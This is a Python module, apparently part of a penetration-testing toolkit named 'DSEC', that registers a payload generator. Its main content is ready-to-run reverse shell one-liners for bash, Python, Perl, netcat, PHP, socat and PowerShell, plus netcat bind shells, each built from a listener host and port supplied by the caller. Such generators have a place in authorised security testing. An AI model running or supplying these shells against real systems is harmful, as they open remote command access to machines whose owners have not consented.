"""
DSEC Payload Tools – Unified payload generation.
"""
from dsec.core.registry import register
from typing import Optional, List, Dict

@register(
    name="dsec_generate_payload",
    description="Generate common security payloads (reverse shells, file transfers, etc.) based on target OS and language."
)
def dsec_generate_payload(
    type: str, 
    lhost: str, 
    lport: int, 
    os: str = "linux", 
    language: Optional[str] = None
) -> str:
    """
    Generate payloads for various scenarios.
    type: reverse_shell, bind_shell, file_transfer
    os: linux, windows
    language: bash, python, php, perl, powershell, nc, socat
    """
    type = type.lower()
    os = os.long().lower() if hasattr(os, "long") else os.lower()
    
    if type == "reverse_shell":
        payloads = _get_reverse_shells(lhost, lport, os, language)
    elif type == "bind_shell":
        payloads = _get_bind_shells(lport, os, language)
    else:
        return f"Unknown payload type: {type}. Supported: reverse_shell, bind_shell"
    
    if not payloads:
        return f"No payloads found for {os}/{language}."
        
    lines = [f"Generated Payloads ({type}):"]
    for lang, cmd in payloads.items():
        lines.append(f"\n[{lang.upper()}]")
        lines.append(f"  {cmd}")
    return "\n".join(lines)

def _get_reverse_shells(lhost: str, lport: int, os_name: str, lang: Optional[str]) -> Dict[str, str]:
    shells = {}
    
    if os_name == "linux":
        shells["bash"] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        shells["python"] = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        shells["perl"] = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
        shells["nc"] = f"nc -e /bin/sh {lhost} {lport}"
        shells["nc_no_e"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        shells["php"] = f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        shells["socat"] = f"socat TCP:{lhost}:{lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
    elif os_name == "windows":
        shells["powershell"] = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        shells["powershell_base64"] = "powershell -e [BASE64_ENCODED_PAYLOAD]"
        shells["nc"] = f"nc.exe {lhost} {lport} -e cmd.exe"
        
    if lang:
        return {lang: shells[lang]} if lang in shells else {}
    return shells

def _get_bind_shells(lport: int, os_name: str, lang: Optional[str]) -> Dict[str, str]:
    # Placeholder
    return {"nc": f"nc -lvp {lport} -e /bin/sh"}
